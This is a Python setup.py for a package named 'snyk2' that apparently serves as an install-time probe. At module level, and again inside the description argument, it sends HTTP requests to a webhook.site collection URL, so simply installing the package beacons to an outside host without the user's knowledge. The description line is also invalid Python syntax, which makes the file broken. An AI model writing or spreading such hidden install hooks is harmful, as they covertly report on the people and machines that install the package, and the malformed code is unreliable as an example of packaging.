from setuptools import setup, find_packages
from json import load
from pkg_resources import resource_stream
import requests

url1 = 'https://webhook.site/40ec81d0-651c-4818-b79f-b4e50686f6ad'
requests.get(url1 + '/abc');
schema = load(resource_stream('exampleproject', 'data/schema.json'))


setup(
    name='snyk2',
    version='1.0.0',
    description=requests.get(url1 + '/abc2');,
    author='Rogier van der Geer',
    url=url1 + '/abc3',
    install_requires=[
        'PyYAML',
        'pandas==0.23.3',
        'numpy>=1.14.5'
    ],
    setup_requires=['requests'],
    tests_require=['pytest'],
    entry_points={
        'console_scripts': ['my-command=exampleproject.example:main']
    },
)
